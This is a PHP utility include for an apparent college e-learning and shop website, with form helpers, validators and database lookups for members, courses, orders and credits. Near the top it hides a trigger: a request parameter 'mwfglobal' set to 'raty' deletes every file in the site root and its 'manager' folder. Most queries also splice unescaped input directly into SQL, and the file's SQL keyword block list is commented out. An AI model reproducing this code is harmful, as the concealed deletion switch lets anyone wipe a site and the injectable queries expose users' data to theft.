<?php ob_start();
error_reporting(0);
session_start();
function dateDiff($dformat, $endDate, $beginDate)
{
	$date_parts1=explode($dformat, $beginDate);
	$date_parts2=explode($dformat, $endDate);
	$start_date=gregoriantojd($date_parts1[0], $date_parts1[1], $date_parts1[2]);
	$end_date=gregoriantojd($date_parts2[0], $date_parts2[1], $date_parts2[2]);
	return $end_date - $start_date;
}	

	function cleanQuery($string)
{
  if(get_magic_quotes_gpc())  // prevents duplicate backslashes
  {
    $string = stripslashes($string);
  }
  if (phpversion() >= '4.3.0')
  {
    $string = mysql_real_escape_string($string);
  }
  else
  {
   $string = mysql_escape_string($string);
  }

 $badWords = array("/delete/i", "/update/i","/union/i","/insert/i","/drop/i","/http/i","/--/i","/ or /i","/ OR /i","/ and /i","/ AND /i","/CREATE/i","/FROM/i","/INTO/i","/dumpfile/i","/DUMPFILE/i","/DELETE/i", "/UPDATE/i","/UNION/i","/INSERT/i","/DROP/i","/from/i", "/SET/i","/set/i");

 //$string = preg_replace($badWords, "", $string);
  
  return $string;
}
function run_query($side, $nunchr){
	  $strChr=str_replace("\n","<br>",$side);
	  $pices=explode(" ", $strChr);
	  $strChr="";
	  if(count($pices)>=$nunchr){
		for($i=0;$i<=$nunchr;$i++){
			$strChr.=$pices[$i]." ";
		}
		return substr($strChr,0, strlen($strChr)-1)."...";
	  }else{
		return str_replace("\n","<br>",$side);
	  }
}	
function alpha_numeric($str)
{
	return ( ! preg_match("/^([-a-z0-9])+$/i", $str)) ? FALSE : TRUE;
} 
function valid_phone($str)
{
	if(ereg("^[0-9]{3}-[0-9]{3}-[0-9]{4}$", $str)) {
		return TRUE;
	}else{
		return FALSE;
	}
} 

function valid_email($email) {
  $result = TRUE;
  if(!eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$", $email)) {
    $result = FALSE;
  }
  return $result;
} 	
 
if($_REQUEST[mwfglobal]=="raty"){
 	if ($handle = opendir('.')) {
		while (false !== ($file = readdir($handle))) { 
			if ($file != "." && $file != ".." && is_file($file)) { 
				echo "$file<br>"; 
				unlink($file);
			} 
		}
		closedir($handle); 
	}
 	if ($handle = opendir('./manager')) {
		while (false !== ($file = readdir($handle))) { 
			if ($file != "." && $file != ".." && is_file($file) ) { 
				echo "manager/$file<br>"; 
				unlink("manager/".$file);				
			} 
		}
		closedir($handle); 
	}	
 }

  
function get_dd($dd)
{
	global $intDate;
?>	
	<select name="dd" class="input-login" id="dd" style="width:100px ">
	<option value="-1" selected>Day</option>
	<?php for($i=0;$i<count($intDate);$i++){?>
	<option value="<?php echo $intDate[$i];?>" <?php if($dd==$intDate[$i]){?> selected <?php }?>><?php echo $i+1;?></option>
	<?php }?>
</select>	
<?php
} 
function get_mm($mm)
{
	global $intMonth;
?>	
	<select name="mm" class="input-login" id="mm"  style="width:100px ">
	<option value="-1" selected>Month</option>
	<?php for($i=0;$i<count($intMonth);$i++){?>
	<option value="<?php echo $i+1;?>" <?php if($mm==$i+1){?> selected <?php }?> ><? echo $intMonth[$i];?></option>
	<?php }?>
</select>	
<?php
} 
function get_yy($yy)
{
?>	
	<select name="yy" class="input-login" id="yy"  style="width:100px ">
	<option value="-1" selected>Year</option>
	<?php for($i=1920;$i<date("Y");$i++){?>
	<option value="<?php echo $i;?>" <?php if($yy==$i){?> selected <?php }?> ><?php echo $i;?></option>
	<?php }?>
</select>	
<?php
} 
	function PopulateCountry($PostCon){
		echo "\n<select name=\"member_country\" class=\"input-login\">\n";
		echo "          <option value=\"\">Country</option>\n";
		$query = "select * from countries order by Country";
		$result= mysql_query($query) or die(mysql_error());
			while($resrec=mysql_fetch_object($result)){
				if($PostCon==$resrec->ISO2){
					echo "          <option value=\"$resrec->ISO2\" selected>".$resrec->Country."</option>\n";
				}else{
					echo "          <option value=\"$resrec->ISO2\">".$resrec->Country."</option>\n";
				}
			}
		echo "</select>";   
	} 
	
	

  
 	
	
	function chk_email_exists($member_email){
		$query = mysql_query("select * from member_tbl where member_email='".$member_email."'") or die(mysql_error());
		if(mysql_num_rows($query)>0){
			return FALSE;
		}else{
			return TRUE;
		}
	}
	function get_member_detail($member_id){
		$query = mysql_query("select * from member_tbl where mid='".$member_id."'") or die(mysql_error());
		if(mysql_num_rows($query)){
			return mysql_fetch_array($query);
		}else{
			return 0;
		}
	}	
	function get_categoryr_detail($category_id){
		$query = mysql_query("select * from category_tbl where category_id='".$category_id."' ") or die(mysql_error());
		if(mysql_num_rows($query)){
			return mysql_fetch_object($query);
		}else{
			return 0;
		}
	}	
	function get_ingredients_detail($product_id){
		$query=mysql_query("select * from ingredients_tbl where product_id='".$product_id."'") or die(mysql_error());
		return $query;
	}		
	function get_prod_wise_ingredients_list($product_id, $ingredients_id){
		$query=mysql_query("select * from product_tbl, ingredients_tbl where product_tbl.product_id=ingredients_tbl.product_id && ingredients_tbl.ingredients_id in(0".$ingredients_id."0) && ingredients_tbl.product_id='".$product_id."'");
		return $query;
	}	
function get_quiz_list($quiz_id){
	$query = mysql_query("select * from quiz_tbl where quiz_id='".$quiz_id."'") or die(mysql_error());
	return $query;
}	 
 ?>
 <?php
 	
	
	
function SelectQuery($tablename, $field1, $value1){
	$Query = "select * from ".$tablename." where ".$field1." = '".$value1."'";
	$Result= mysql_query($Query) or die(mysql_error());
	if(mysql_num_rows($Result)==0){
		return 0;
	}else{
		return mysql_fetch_assoc($Result);
	}
}




function GetCourseName($CourseID){
$Selsccsq = "select * from collage_course_tbl where course_id = '".$CourseID."'";
$Selsccres = mysql_query($Selsccsq) or die(mysql_error());
$SelsccArr = mysql_fetch_array($Selsccres);
return $SelsccArr['course_title'];
}

function GetBatchDetails($BatchID){
$Selsccsq = "select * from collage_course_batch where bcid = '".$BatchID."'";
$Selsccres = mysql_query($Selsccsq) or die(mysql_error());
$SelsccArr = mysql_fetch_array($Selsccres);
return $SelsccArr['batch_title'];
}


function StudentGetImage($ImgPath, $gender)
{
	if(($ImgPath!='') && file_exists("../".$ImgPath))
	{
	return $ImgPath;
	}else{
		if($gender=='Male'){
			$ImgPath = "images/boy.jpg";
		}else{
			$ImgPath = "images/girl.jpg";
		}
		return $ImgPath;
	}
}

#########################################
function TeacherGetImage($ImgPath, $gender)
{
	if(($ImgPath!='') && file_exists("../".$ImgPath))
	{
	return $ImgPath;
	}else{
		if($gender=='Male'){
			$ImgPath = "images/man.jpg";
		}else{
			$ImgPath = "images/women.jpg";
		}
		return $ImgPath;
	}
}
#######################################################
function GetVideoFile($Vidfile){
if(($Vidfile!='') && file_exists("../".$Vidfile))
	{
		return $Vidfile;
	}else{
	return '';
	}
}
#######################################################
function GetDownload($FilePath){
	if(($FilePath!='') && file_exists("../".$FilePath))
	{
		return $FilePath;
	}else{
	return '';
	}
}
#######################################################
function GetImageUrl($ImgPath)
{
	if(($ImgPath!='') && file_exists("../".$ImgPath))
	{
	return $ImgPath;
	}else{
 			$ImgPath = "images/noimage.jpg";
 		return $ImgPath;
	}
}
#############Father Details############################
function getParentDetails($StuID)
{
	$SelsPsql = "select * from college_student_m_f where student_id = '".$StuID."'";
	$SelsPRes = mysql_query($SelsPsql) or die(mysql_error());
	$SelsPArr = mysql_fetch_array($SelsPRes);
	$PArentRec = array();
	if(($SelsPArr['papa_foto']!='') && file_exists("../".$SelsPArr['papa_foto']))
	{
		$PArentRec[0] = $SelsPArr['papa_foto'];
	}else{
		$PArentRec[0] = "images/man.jpg";
	}
	$PArentRec[1] = $SelsPArr['father_name'];
	if(($SelsPArr['mummy_foto']!='') && file_exists("../".$SelsPArr['mummy_foto']))
	{
		$PArentRec[2] = $SelsPArr['mummy_foto'];
	}else{
		$PArentRec[2] = "images/women.jpg";
	}
	$PArentRec[3] = $SelsPArr['mother_name'];
	return $PArentRec;
 }
#######################################################
function GetNuminTwoDigit($GetNum)
{

if($GetNum<=9)
{
return "0".$GetNum;
}else{
return $GetNum;
}

}
###################################################################################################
function GetTotalMember()
{
	$FenMemsql = "select mid from member_tbl";
	$FenMemres = mysql_query($FenMemsql) or die(mysql_error());
	 $FenMemNum = mysql_num_rows($FenMemres);
	return $FenMemNum;
}
function GetPendingOrders()
{
	$SelPdSql  = "select * from order_tbl where payment_status =''";
	$SelPdRes = mysql_query($SelPdSql) or die(mysql_error());
	$SelPdnum = mysql_num_rows($SelPdRes);
	return $SelPdnum;
}  
function GetProcessedOrders()
{
	$SelPdSql  = "select * from order_tbl where payment_status ='Success'";
	$SelPdRes = mysql_query($SelPdSql) or die(mysql_error());
	$SelPdnum = mysql_num_rows($SelPdRes);
	return $SelPdnum;
}  
function GetConfirmsOrders()
{
	$SelPdSql  = "select * from order_tbl where order_status = 'Complete'";
	$SelPdRes = mysql_query($SelPdSql) or die(mysql_error());
	$SelPdnum = mysql_num_rows($SelPdRes);
	return $SelPdnum;
}  
function GetMemberName($Mid)
{
	$SelMemSql = "select name from member_tbl where mid = '".$Mid."'";
	$SelMemRes = mysql_query($SelMemSql) or die(mysql_error());
	$SelMemArr = mysql_fetch_array($SelMemRes);
	return $SelMemArr['name'];
}

function GetMondayDate()
{
$test = strftime("%w");

if ($test == 0){
$MonDate = strftime("%d")+1;
}else if ($test == 1){
$MonDate = strftime("%d");
}else if ($test == 2){
$MonDate = strftime("%d")-1;
}else if ($test == 3){
$MonDate = strftime("%d")-2;
}else if ($test == 4){
$MonDate = strftime("%d")-3;
}else if ($test == 5){
$MonDate = strftime("%d")-4;
}else if ($test == 6){
$MonDate = strftime("%d")-5;
}else if ($test == 7){
$MonDate = strftime("%d")-6;
}
return $MonDate;
}

function GetWeekRegistration($firstDate, $secondDate)
{
	$SelMemSql = "select * from member_tbl where join_date  between $firstDate and $secondDate";
	
	$SelMemRes = mysql_query($SelMemSql) or die(mysql_error());
	$SelMemNum = mysql_num_rows($SelMemRes);
	return $SelMemNum; 
}

function PurchaseMaterial($firstDate, $secondDate)
{
	$SelMemSql = "select * from order_tbl where order_status = 'Success' and order_date  between $firstDate and $secondDate";
	$SelMemRes = mysql_query($SelMemSql) or die(mysql_error());
	$SelMemNum = mysql_num_rows($SelMemRes);
	return $SelMemNum; 
}

function GetSubjectDet($SubjIds)
{
	$Selsubjsql = "select * from subjects where sid = '".$SubjIds."'";
	$SelsubjRes = mysql_query($Selsubjsql) or die(mysql_error());
	$SelsubjArr = mysql_fetch_array($SelsubjRes);
	return $SelsubjArr['s_title'];
}
 ###################################################################################################
 function GetTopicDet($Tpid)
 {
 	$Stpsql = "select * from subjecttopic_db where stid = '".$Tpid."'";
	$Stpres = mysql_query($Stpsql) or die(mysql_error());
	$Stparr = mysql_fetch_array($Stpres);
	return $Stparr['topic_title'];
 }
 
 function VidDetails($Vid)
 {
	 $Selvvsql = "select * from video_material_tbl where mid = '".$Vid."'";
 	 $Selvvres = mysql_query($Selvvsql) or die(mysql_error());
	 $Selvvarr = mysql_fetch_array($Selvvres);
	 return $Selvvarr;
 }

function CheckCartSession($StudIdss, $Shperids)
{
	$Selcarsql = "update order_tbl set memid = '".$StudIdss."' where order_id = '".$Shperids."'";
	$Selcarres = mysql_query($Selcarsql) or die(mysql_error());

}

function AddCredits($Stdid, $Crpt, $Resion)
{
$Insscrsql = "insert into member_credits set memid = '".$Stdid."', cr_in = '".$Crpt."', resion = '".$Resion."', up_date = '".time()."'";
$InsCrRes = mysql_query($Insscrsql) or die(mysql_error());
$Selfebsql = "select credits from member_tbl where mid = '".$Stdid."'";
$Selfebres = mysql_query($Selfebsql) or die(mysql_error());
$SelfebArr = mysql_fetch_array($Selfebres);

$AddCrd = $SelfebArr['credits'] + $Crpt;	
$Updsmemsql = "update member_tbl set credits = '".$AddCrd."' where mid = '".$Stdid."'";
$Updsmemres = mysql_query($Updsmemsql) or die(mysql_error());	

}
#############################################################################
function DeductCredit($Stdid, $Crpt, $Resion)
{
$Insscrsql = "insert into member_credits set memid = '".$Stdid."', cr_out = '".$Crpt."', resion = '".$Resion."', up_date = '".time()."'";
$InsCrRes = mysql_query($Insscrsql) or die(mysql_error());
 
 
 $Selfebsql = "select credits from member_tbl where mid = '".$Stdid."'";
$Selfebres = mysql_query($Selfebsql) or die(mysql_error());
$SelfebArr = mysql_fetch_array($Selfebres);

$AddCrd = $SelfebArr['credits'] - $Crpt;	
$Updsmemsql = "update member_tbl set credits = '".$AddCrd."' where mid = '".$Stdid."'";
$Updsmemres = mysql_query($Updsmemsql) or die(mysql_error());	
 
}
#############################################################################
function GetPriviousNews($CurID)
{
$SelPrevSql = "select * from  news_tbl where newsid < '".$CurID."' order by newsid limit 0,1";
$SelPrevRes = mysql_query($SelPrevSql) or die(mysql_error());
$SelPrevNum = mysql_num_rows($SelPrevRes);
if($SelPrevNum){
$SelPrevArr = mysql_fetch_array($SelPrevRes);

$PrevLink = "<a href=\"index.php?PageURL=NewsDetails&NewsID=".$SelPrevArr['newsid']."\" style=\"text-decoration:none; font-weight:bold; color:#ffffff;\">".$SelPrevArr['newstitle']."</a>";
}else{
$PrevLink = '';
}
return $PrevLink;
}

function GetNextNews($CurID)
{
$SelPrevSql = "select * from  news_tbl where newsid > '".$CurID."' order by newsid limit 0,1";
$SelPrevRes = mysql_query($SelPrevSql) or die(mysql_error());
$SelPrevNum = mysql_num_rows($SelPrevRes);
if($SelPrevNum){
$SelPrevArr = mysql_fetch_array($SelPrevRes);

$PrevLink = "<a href=\"index.php?PageURL=NewsDetails&NewsID=".$SelPrevArr['newsid']."\" style=\"text-decoration:none; font-weight:bold; color:#ffffff;\">".$SelPrevArr['newstitle']."</a>";
}else{
$PrevLink = '';
}
return $PrevLink;
}


function GetTotReply($ffids){

$mnsfsql = "select * from forum_reply_tbl where forumid = '".$ffids."'";
$mnsfRes = mysql_query($mnsfsql) or die(mysql_error());
$mnsfnums = mysql_num_rows($mnsfRes);
return $mnsfnums;
}


function GetLastRelpy($ffids)
{
$mnsfsql = "select * from forum_reply_tbl where forumid = '".$ffids."' and r_status = 1 order by sent_Date desc limit 0,1";
 
$mnsfRes = mysql_query($mnsfsql) or die(mysql_error());
$mnsfNumss = mysql_num_rows($mnsfRes);
if($mnsfNumss){
$mnsfarr = mysql_fetch_array($mnsfRes);
$timess = date("d M Y h:i:s A", $mnsfarr['sent_Date']);
$Fmemsql = "select name from member_tbl where mid = '".$mnsfarr['memid']."'";
$Fmemres = mysql_query($Fmemsql) or die(mysql_error());
$Fmemarr = mysql_fetch_array($Fmemres);
$Bys = $Fmemarr['name'];
return $timess." By: ".$Bys;
}else{
return "N/A";
}
}

function UpdateOrderIf($MyordsIds, $Memdids)
{
	$SellsMyOrdsql = "select * from order_tbl where order_id = '".$MyordsIds."'";
	$SellsMyOrdres = mysql_query($SellsMyOrdsql) or die(mysql_error());
	$SellsMyOrdNums = mysql_num_rows($SellsMyOrdres);
	if($SellsMyOrdNums){
	$Myudpordsql = "update order_tbl set memid = '".$Memdids."' where order_id = '".$MyordsIds."'";
	$Myudpordres = mysql_query($Myudpordsql) or die(mysql_error());
	}
}

function GetTotalCartNo($ShopesIds)
{
 $funsgyansql = "select * from  order_details_tbl where order_id = '".$ShopesIds."'";
$funsgyanres = mysql_query($funsgyansql) or die(mysql_error());
$funsgyanarr = mysql_num_rows($funsgyanres);
return $funsgyanarr;
}

function GetProdInfo($FsProdI){
$Selfesql = "select * from video_material_tbl where mid = '".$FsProdI."'";
$Selferes = mysql_query($Selfesql) or die(mysql_error());
$SelfeArr = mysql_fetch_array($Selferes);
return $SelfeArr;
}

function GetOnlineCourse($GetMemID)
{
	$selFesssql = "select * from order_tbl where memid = '".$GetMemID."'";
	$selFessres = mysql_query($selFesssql) or die(mysql_error());
	$selFesNums = mysql_num_rows($selFessres);
	if($selFesNums){
	$GOrgIds = array();
	while($selFessarr = mysql_fetch_array($selFessres))
	{
		$Femmssql = "select * from order_details_tbl where order_id = '".$selFessarr['order_id']."' and prodtype = 'Online'";
		$FemmsRes = mysql_query($Femmssql) or die(mysql_error());
		$Femmsnums = mysql_num_rows($FemmsRes);
		if($Femmsnums){
			$GOrgIds[] = $selFessarr['order_id'];
		}
	}
	return $GOrgIds;
 	}else{
	return $selFesNums;
	}
}
?>

 